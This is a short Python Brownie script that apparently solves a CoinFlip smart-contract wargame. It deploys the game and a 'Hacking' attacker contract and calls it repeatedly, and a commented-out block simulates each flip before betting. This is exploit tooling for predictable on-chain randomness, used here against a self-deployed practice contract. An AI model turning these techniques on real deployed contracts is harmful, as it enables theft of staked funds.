from brownie import CoinFlip, accounts, Contract, Hacking
import json
from scripts.helpful_scripts import get_account
import time


with open(r"./build/contracts/CoinFlip.json", "r") as j:
    abi = json.loads(j.read())
abi = abi["abi"]
# print(abi)


def main():
    account = get_account()
    hack = CoinFlip.deploy({"from": account})
    hacker = Hacking.deploy(hack.address, {"from": account})

    for i in range(10):
        hacker.hackerjob({"from": account})
        time.sleep(4)
    # # hack = CoinFlip.deploy({"from": accounts[0]})
    # for i in range(100):
    #     try:
    #         bool = hack.flip.call(True, {"from": account})
    #         if bool:
    #             hack.flip(True, {"from": account})
    #         else:
    #             hack.flip(False, {"from": account})
    #         print(bool)
    #     except:
    #         continue
    #     print(hack.consecutiveWins({"from": account}))
    #     time.sleep(13)
